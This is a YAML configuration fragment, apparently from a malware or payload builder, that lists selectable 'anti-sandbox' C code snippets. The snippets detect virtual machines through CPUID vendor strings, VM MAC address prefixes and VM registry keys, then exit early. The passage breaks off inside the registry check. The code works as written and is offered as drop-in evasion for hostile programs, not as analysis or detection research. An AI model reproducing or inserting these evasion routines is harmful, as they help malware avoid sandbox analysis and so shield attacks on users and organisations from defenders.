  - id: CpuidVMVendor
    display: CPUID VM Vendor String
    default: false
    snippet: "// Anti-sandbox: Check for VM vendor strings via CPUID\n{\n    int cpuInfo[4] = {0};\n    __cpuid(cpuInfo, 0x40000000);\n    char vendor[13] = {0};\n    memcpy(vendor, &cpuInfo[1], 4);\n    memcpy(vendor + 4, &cpuInfo[2], 4);\n    memcpy(vendor + 8, &cpuInfo[3], 4);\n    \n    // Known VM vendors\n    if (strstr(vendor, \"VMwareVMware\") || strstr(vendor, \"Microsoft Hv\") ||\n        strstr(vendor, \"VBoxVBoxVBox\") || strstr(vendor, \"KVMKVMKVM\") ||\n        strstr(vendor, \"XenVMMXenVMM\") || strstr(vendor, \"prl hyperv\")) {\n        return 0;\n    }\n}\n"
  - id: MacAddressCheck
    display: MAC Address VM Detection
    default: false
    snippet: |
      // Anti-sandbox: Check for VM MAC address prefixes
      {
          IP_ADAPTER_INFO adapterInfo[16];
          DWORD bufLen = sizeof(adapterInfo);
          if (GetAdaptersInfo(adapterInfo, &bufLen) == ERROR_SUCCESS) {
              PIP_ADAPTER_INFO pAdapter = adapterInfo;
              while (pAdapter) {
                  // VMware: 00:0C:29, 00:50:56, 00:05:69
                  // VirtualBox: 08:00:27
                  // Hyper-V: 00:15:5D
                  // Parallels: 00:1C:42
                  if ((pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x0C && pAdapter->Address[2] == 0x29) ||
                      (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x50 && pAdapter->Address[2] == 0x56) ||
                      (pAdapter->Address[0] == 0x08 && pAdapter->Address[1] == 0x00 && pAdapter->Address[2] == 0x27) ||
                      (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x15 && pAdapter->Address[2] == 0x5D) ||
                      (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x1C && pAdapter->Address[2] == 0x42)) {
                      return 0;
                  }
                  pAdapter = pAdapter->Next;
              }
          }
      }
  - id: RegistryVMCheck
    display: Registry VM Artifacts
    default: false
    snippet: |
      // Anti-sandbox: Check registry for VM artifacts
      {
          HKEY hKey;
          const wchar_t* vmKeys[] = {
              L"SOFTWARE\\VMware, Inc.\\VMware Tools",
              L"SOFTWARE\\Oracle\\VirtualBox Guest Additions",
              L"SYSTEM\\CurrentControlSet\\Services\\VBoxSF",
              L"SYSTEM\\CurrentControlSet\\Services\\vmci",
              L"SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters"
          };
          for (int i = 0; i < 5; i++) {
